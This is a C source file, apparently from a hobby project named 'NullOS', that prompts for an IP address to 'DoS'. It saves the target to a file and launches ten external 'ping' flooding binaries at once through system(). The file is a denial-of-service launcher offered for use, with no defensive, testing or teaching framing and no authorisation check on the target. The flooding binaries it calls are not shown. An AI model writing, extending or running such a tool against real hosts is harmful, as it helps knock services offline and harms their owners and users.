#include <stdio.h>
#include <stdlib.h>

int main() {
    char ip[150];
    char filepath[1024];
    char command[2048];

    char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Error: HOME environment variable not set\n");
        return 1;
    }

    snprintf(filepath, sizeof(filepath), "%s/Documents/NullOS/Null/c/ip.txt", home);

    printf("\nWhat IP you wanna DoS\n>> ");
    scanf("%149s", ip);

    FILE *f = fopen(filepath, "w");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fprintf(f, "%s\n", ip);
    fclose(f);

    snprintf(command, sizeof(command),
             "%s/Documents/NullOS/Null/c/dos/ping1 & "
             "%s/Documents/NullOS/Null/c/dos/ping2 & "
             "%s/Documents/NullOS/Null/c/dos/ping3 & "
             "%s/Documents/NullOS/Null/c/dos/ping4 & "
             "%s/Documents/NullOS/Null/c/dos/ping5 & "
             "%s/Documents/NullOS/Null/c/dos/ping6 & "
             "%s/Documents/NullOS/Null/c/dos/ping7 & "
             "%s/Documents/NullOS/Null/c/dos/ping8 & "
             "%s/Documents/NullOS/Null/c/dos/ping9 & "
             "%s/Documents/NullOS/Null/c/dos/ping10",
             home, home, home, home, home,
             home, home, home, home, home
    );

    printf("If you want to stop this, press CTRL+C.\n");
    printf("Starting DoS...\n");

    system(command);

    return 0;
}
